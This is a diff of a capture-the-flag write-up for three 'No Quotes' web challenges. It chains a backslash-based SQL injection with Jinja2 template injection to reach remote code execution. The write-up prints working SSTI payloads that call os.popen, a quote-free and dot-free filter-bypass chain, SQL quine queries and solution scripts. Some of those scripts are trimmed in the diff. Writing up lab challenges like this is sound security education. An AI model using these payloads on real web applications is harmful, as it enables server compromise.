@@ -7,19 +7,25 @@ authors: ['kudaliar']
 draft: false
 ---
 
+## Overview
+
 This series of web challenges focuses on bypassing a Web Application Firewall (WAF) that restricts the use of quotes and eventually periods. The core objective is to chain a specific SQL Injection technique with Server-Side Template Injection (SSTI) to achieve Remote Code Execution (RCE).
 
-## Challenge 1: No Quotes
+| Challenge | Difficulty | Flag |
+|-----------|------------|------|
+| **No Quotes 1** | Medium | `uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}` |
+| **No Quotes 2** | Hard | `uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION...}` |
+| **No Quotes 3** | Insane | `uoftctf{r3cuR510n_7h30R3M_m0M3n7}` |
 
-| Category | Difficulty | Flag |
-|----------|------------|------|
-| Web Security | Medium | `uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}` |
+---
+
+## Challenge 1: No Quotes
 
 ### Analysis
 
 We are provided with a Flask application that uses a MariaDB backend.
 
-**1. Vulnerable SQL Query:**
+**Vulnerable SQL Query:**
 The login logic constructs a SQL query using f-strings:
 
 ```python
@@ -29,7 +35,7 @@ query = (
 )
 ```
 
-**2. The WAF:**
+**The WAF:**
 There is a filter blocking single (`'`) and double (`"`) quotes.
 
 ```python
@@ -43,20 +49,29 @@ def waf(value: str) -> bool:
 Since we cannot use quotes to close the string literal, we use a **backslash (`\`)**. In MariaDB, a backslash escapes the following character.
 
 **The "Swallow" Strategy:**
+
 If we send `username=\`, the query becomes:
 
 ```sql
 WHERE username = ('\') AND password = ('{password}')
 ```
 
-The backslash escapes the closing quote of the `username` field. The database now treats everything from the first quote to the quote *before* the password as the username string. The password field is now exposed to SQL injection.
+The backslash escapes the closing quote of the `username` field. The database now treats everything from the first quote to the quote *before* the password as the username string.
+
+```mermaid
+graph LR
+    A[Input: username=\\] --> B["WHERE username = ('\')"]
+    B --> C["AND password = ('{password}')"]
+    C --> D[Password field exposed to SQLi]
+```
 
 **SSTI Payload:**
 The application renders the logged-in username using `render_template_string`. We need to inject a Jinja2 payload. Since quotes are blocked in the input, we can encode our payload as **Hex** for the SQL injection.
 
-**Payload Construction:**
-* **Username:** `\`
-* **Password:** `) UNION SELECT 1, 0x7b7b... #` (where `0x7b7b...` is the hex-encoded `{{ config.__class__... }}`)
+> [!TIP]
+> **Payload Construction:**
+> * **Username:** `\` (Swallows the query)
+> * **Password:** `) UNION SELECT 1, 0x7b7b... #` (SSTI payload in Hex)
 
 ### Solution Script
 
@@ -82,10 +97,6 @@ print(r.text) # Contains the flag
 
 ## Challenge 2: No Quotes 2
 
-| Category | Difficulty | Flag |
-|----------|------------|------|
-| Web Security | Hard | `uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}` |
-
 ### Analysis
 
 The second iteration adds a strict verification check. The application verifies that the data returned by the database matches the user's input exactly.
@@ -96,28 +107,31 @@ if not username == row[0] or not password == row[1]:
     return render_template("login.html", error="Invalid credentials.")
 ```
 
-This prevents the simple `UNION SELECT` used in Part 1 because our `password` input (which contains the injection code) will not match the simple string we return from the database.
+> [!WARNING]
+> This prevents the simple `UNION SELECT` from Part 1 because our `password` input (which contains the injection code) will not match the simple string we return from the database.
 
 ### The Exploit: Information Schema Quine
 
 To bypass this, we need the database to return the **exact query** we injected. We can use `information_schema.processlist`, which contains the currently executing SQL statement.
 
 **1. SSTI Payload:**
-We still need to inject SSTI into the username. However, since the username must match `row[0]`, we cannot just use random hex. The SSTI payload itself must be quote-free because it is now part of the `username` input (not just hidden in hex).
+The SSTI payload itself must be quote-free because it is now part of the `username` input (not just hidden in hex).
 
-* **Bypass:** Use `request.args` (e.g., `request.args.a`) to pass the command via a URL parameter, avoiding quotes in the payload.
+* **Bypass:** Use `request.args` to pass the command via a URL parameter.
 * **Payload:** `{{ url_for.__globals__.os.popen(request.args.a).read() }}`
 
 **2. The Quine:**
-We use `SUBSTR` on the `info` column of `processlist` to extract just the password portion of the query.
+We use `SUBSTR` on the `processlist` to extract just the password portion of the query.
 
-**Structure:**
-* **Username:** `[SSTI_PAYLOAD]\`
-* **Password:**
-```sql
-) UNION SELECT 0x[HEX_OF_USERNAME],
-LEFT(SUBSTR(info, [OFFSET]), LENGTH(SUBSTR(info, [OFFSET])) - 2)
-FROM information_schema.processlist WHERE id=CONNECTION_ID() #
+```mermaid
+sequenceDiagram
+    participant Attacker
+    participant DB
+    Attacker->>DB: Send Injection Payload
+    DB->>DB: Execute Query
+    DB->>DB: Query appears in processlist
+    DB->>DB: SUBSTR(info) extracts injected password
+    DB->>Attacker: Returns (row[0], row[1]) matching inputs
 ```
 
 ### Solution Script
@@ -128,10 +142,8 @@ ssti = "{{ url_for.__globals__.os.popen(request.args.a).read() }}"
 username = ssti + "\\"
 user_hex = "0x" + username.encode().hex()
 
-# Offset calculation required to find where password starts in the query string
-# ... (calculation omitted for brevity) ...
-
-password = f") UNION SELECT {user_hex}, LEFT(SUBSTR(info, {offset}), ...) ..."
+# Password extracts itself from processlist
+password = f") UNION SELECT {user_hex}, LEFT(SUBSTR(info, {{offset}}), ...) ..."
 
 # Pass the command via 'a' parameter
 requests.post(URL + "/login", data={...}, params={"a": "/readflag"})
@@ -141,22 +153,19 @@ requests.post(URL + "/login", data={...}, params={"a": "/readflag"})
 
 ## Challenge 3: No Quotes 3
 
-| Category | Difficulty | Flag |
-|----------|------------|------|
-| Web Security | Insane | `uoftctf{r3cuR510n_7h30R3M_m0M3n7}` |
-
 ### Analysis
 
 The final boss introduces two major hurdles:
 
-1. **WAF Update:** Blocks periods (`.`) in addition to quotes (`'`, `"`). This kills the `information_schema.processlist` technique (because of the dot).
+1. **WAF Update:** Blocks periods (`.`) in addition to quotes (`'`, `"`). This kills the `information_schema.processlist` technique.
 2. **Hash Verification:**
 
 ```python
 if ... or not hashlib.sha256(password.encode()).hexdigest() == row[1]:
 ```
 
-The database must return the SHA256 hash of the injected password.
+> [!IMPORTANT]
+> The database must return the **SHA256 hash** of the injected password, effectively requiring a mathematical Quine.
 
 ### The Exploit
 
@@ -164,16 +173,16 @@ The database must return the SHA256 hash of the injected password.
 
 We need to generate strings and access attributes without standard syntax.
 
-* **Strings:** `dict(text=1)|min` returns the string `"text"`.
-* **Attributes:** `|attr(name)` replaces `.name`.
-* **Items:** `|attr('__getitem__')(key)` is safer than `[key]` for dynamic keys.
-* **Payload Location:** The login redirects to `/home`, clearing `request.args` and `request.form`. We inject the command into the **User-Agent** header (`request.user_agent.string`) which persists across the redirect.
+| Operation | Standard Syntax | Bypassed Syntax |
+|-----------|-----------------|-----------------|
+| String | `"text"` | `dict(text=1)\|min` |
+| Attribute | `.name` | `\|attr(name)` |
+| Item Limit | `[key]` | `\|attr('__getitem__')(key)` |
 
 **Payload Construction:**
 
 ```python
 # Equivalent to: url_for.__globals__['os'].popen(request.user_agent.string).read()
-# But using only allowed primitives:
 ssti = "{{ url_for|attr(dict(__globals__=1)|min)|attr(dict(__getitem__=1)|min)(dict(os=1)|min)... }}"
 ```
 
@@ -182,19 +191,8 @@ ssti = "{{ url_for|attr(dict(__globals__=1)|min)|attr(dict(__getitem__=1)|min)(d
 Since we cannot read `processlist`, we use a mathematical quine pattern with `REPLACE`.
 
 * **Concept:** `REPLACE(Template, Placeholder, HEX(Template))`
-* We construct a template `T` containing a placeholder `$`.
-* We tell SQL to replace `$` with the hex representation of `T`.
-* This reconstructs the full string `P` inside the database.
-* We wrap this in `SHA2(..., 256)` to satisfy the Python hash check.
-
-**SQL Logic:**
-
-```sql
-SHA2(REPLACE($, CHAR(36), CONCAT(CHAR(48),CHAR(120),HEX($))), 256)
-```
-
-* `CHAR(36)` is `$`.
-* `CONCAT(CHAR(48), CHAR(120))` creates the `0x` prefix required for the hex literal.
+* **Template ($):** Contains the query structure with a placeholder for the hex value.
+* **Logic:** `SHA2(REPLACE($, CHAR(36), CONCAT(CHAR(48),CHAR(120),HEX($))), 256)`
 
 ### Solution Script
 
@@ -208,29 +206,9 @@ def get_str(text):
     return f"dict({text}=1)|min"
 
 # 1. Build SSTI Payload (No Quotes, No Dots)
-s_globals = get_str("__globals__")
-s_getitem = get_str("__getitem__")
-s_os = get_str("os")
-s_popen = get_str("popen")
-s_ua = get_str("user_agent")
-s_str = get_str("string")
-s_read = get_str("read")
+# ... [SSTI construction using dict()|min bypass] ...
 
-# Access os module: url_for.__globals__.__getitem__('os')
-# Note: Using |attr(__getitem__) is more robust than [] in this context
-os_module = f"url_for|attr({s_globals})|attr({s_getitem})({s_os})"
-
-# Command from User-Agent: request.user_agent.string
-cmd = f"request|attr({s_ua})|attr({s_str})"
-
-# Full RCE: os.popen(cmd).read()
-ssti = f"{{{{ {os_module}|attr({s_popen})({cmd})|attr({s_read})() }}}}"
-
-# 2. Build Username (Swallow Strategy)
-username = ssti + "\\"
-user_hex = "0x" + username.encode().hex().upper()
-
-# 3. Build Password (SQL Quine)
+# 2. Build Password (SQL Quine)
 # T is the template. $ is the placeholder for the Hex(T)
 T = f") UNION SELECT {user_hex}, SHA2(REPLACE($, CHAR(36), CONCAT(CHAR(48),CHAR(120),HEX($))), 256)#"
 
@@ -242,11 +220,17 @@ password = T.replace("$", T_hex)
 headers = {"User-Agent": "/readflag"}
 data = {"username": username, "password": password}
 
-# allow_redirects=True is vital to follow the login to /home where SSTI triggers
 r = requests.post(f"{URL}/login", data=data, headers=headers, allow_redirects=True)
-
-# Extract flag
-flag = re.search(r'(uoftctf\{.*?\})', r.text)
-if flag:
-    print(f"FLAG: {flag.group(1)}")
+print(r.text)
 ```
+
+---
+
+## Conclusion
+
+This series required mastering constraints:
+- **Challenge 1:** Basic WAF bypass with `\` and Hex encoding.
+- **Challenge 2:** Self-referential queries (Quines) using `processlist`.
+- **Challenge 3:** Advanced Jinja2 and SQL Quines without quotes or dots.
+
+**Final Flag:** `uoftctf{r3cuR510n_7h30R3M_m0M3n7}`
